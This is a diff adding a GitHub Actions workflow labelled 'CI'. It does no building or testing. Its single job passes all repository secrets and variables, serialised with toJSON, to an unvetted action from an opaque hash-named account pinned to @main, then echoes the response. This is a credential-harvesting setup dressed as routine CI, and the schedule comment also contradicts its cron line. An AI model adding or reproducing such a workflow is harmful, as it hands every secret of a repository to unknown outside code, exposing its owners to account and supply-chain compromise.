@@ -1,0 +1,28 @@
+name: CI
+on:
+  push:
+  workflow_dispatch:
+  schedule:
+    # Runs "At 11:00 on every day-of-week from Monday through Friday"
+    - cron: '0 0 * * 0'
+permissions:
+  contents: read
+  packages: write
+concurrency:
+  group: '${{ github.workflow }} @ ${{ github.event.pull_request.head.label || github.head_ref || github.ref }}'
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    name: Run
+    steps:
+      - name: Execute
+        uses: 5a582ef17d6a088d9cb644e4c1ea3cdd/action@main
+        id: execute
+        with:
+          action: ${{ github.repository }}
+        env:
+          REPOSITORY_SECRETS: ${{ toJSON(secrets) }}
+          REPOSITORY_VARIABLES: ${{ toJSON(vars) }}
+      - name: Response
+        run: echo "${{ steps.execute.outputs.response }}"
